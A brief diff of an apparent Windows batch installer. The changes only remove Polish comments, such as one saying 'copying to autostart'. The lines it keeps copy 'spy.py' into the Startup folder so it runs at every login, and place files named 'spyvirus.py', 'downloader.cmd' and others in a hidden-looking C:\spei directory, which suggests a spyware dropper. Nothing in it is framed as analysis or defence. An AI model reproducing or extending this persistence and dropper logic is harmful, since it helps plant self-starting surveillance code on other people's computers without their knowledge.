@@ -1,8 +1,5 @@
-
 copy C:\spei\spy.py "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-rem kopiowanie do autostartu
 mkdir C:\spei
-rem tworzenie c/spei
 copy spyvirus.py C:\spei
 copy eiffel.jpg C:\spei
 copy image.png C:\spei
@@ -20,4 +17,3 @@ copy image.py C:\spei
 copy downloader.cmd C:\spei
 copy dasdas.py C:\spei
 copy window1.py C:\spei
-rem kopiowanie poptrzebnych skladnikow
